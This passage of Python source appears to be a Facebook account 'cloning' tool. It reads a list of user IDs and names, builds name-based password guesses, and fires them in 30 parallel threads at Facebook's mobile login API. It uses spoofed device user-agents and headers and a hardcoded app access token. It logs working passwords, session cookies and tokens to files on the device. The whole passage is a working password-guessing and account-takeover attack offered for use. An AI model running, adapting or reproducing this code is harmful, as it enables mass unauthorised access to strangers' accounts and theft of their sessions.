"[FBAN/FB4A;FBAV/40.0.0.14.163;FBBV/31334544;FBDM/{density=2.7,width=1319,height=1380};FBLC/en_US;FBRV/30669290;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A015F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/377.0.0.7.79;FBBV/60220905;FBDM/{density=9.3,width=1040,height=1204};FBLC/en_PK;FBRV/81842039;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106M;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/93.0.0.40.91;FBBV/49080965;FBDM/{density=5.2,width=975,height=2145};FBLC/en_PK;FBRV/32012658;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737R4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/384.0.0.47.73;FBBV/17164166;FBDM/{density=9.2,width=1429,height=2152};FBLC/en_US;FBRV/23329039;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A536V;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/308.0.0.77.137;FBBV/40518537;FBDM/{density=8.1,width=530,height=2159};FBLC/en_PK;FBRV/19492728;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G600FY;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/327.0.0.15.136;FBBV/16732225;FBDM/{density=7.1,width=1097,height=1894};FBLC/en_US;FBRV/53846109;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G530H;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/140.0.0.96.183;FBBV/50118526;FBDM/{density=1.9,width=1156,height=2198};FBLC/en_GB;FBRV/31235212;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737S;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/178.0.0.74.24;FBBV/53910913;FBDM/{density=3.8,width=554,height=1479};FBLC/en_US;FBRV/15906770;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J410F;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/310.0.0.50.173;FBBV/14952491;FBDM/{density=9.3,width=1255,height=1108};FBLC/en_US;FBRV/99711931;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G981N;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/283.0.0.57.56;FBBV/67770030;FBDM/{density=7.4,width=551,height=2357};FBLC/en_PK;FBRV/41157774;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G781B;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/326.0.0.27.52;FBBV/57752353;FBDM/{density=5.2,width=1097,height=2051};FBLC/en_GB;FBRV/12245787;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G610Y;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
])
	return ua
	

nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))

class iAmMain:


	def __init__(self):
		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):

		logo()

		p(" [1] File Cloning ")
		p(" [E] Exit Tool ")
		line()

		opt1 = input(" {•} Select An Option : ")
		if opt1 == "1":self.file_menu()
		elif opt1 == "2":self.num_menu()
		elif opt1 == "E":exit(" [•] HAVE A NICE DAY")
		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()


	def file_menu(self):
		logo()
		p(" [•] Example /sdcard/File.txt")
		file = input(" [•] Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()

	def method_select(self,id):
		logo()
		p(" [1] Method (Old & New) ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("iii")
			self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 20 Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should Be Under 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Password Example : First Last, First123, Last123, First786 ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()
		p(" Total File Accounts : %s "%(str(len(id))))
		p(" Proces has been started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):

		line()
		p(" [•] Cloning Has Been Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()
		
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ASMAT %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}

				headers = {'User-Agent': iAmMethod3Ua(),

'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[ASMAT-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ASMAT_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ASMAT_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ASMAT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ASMAT_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
		self.iAmPasswordManager()
if __name__=="__main__":
	#update()
	iAmMain().iAmMenu()
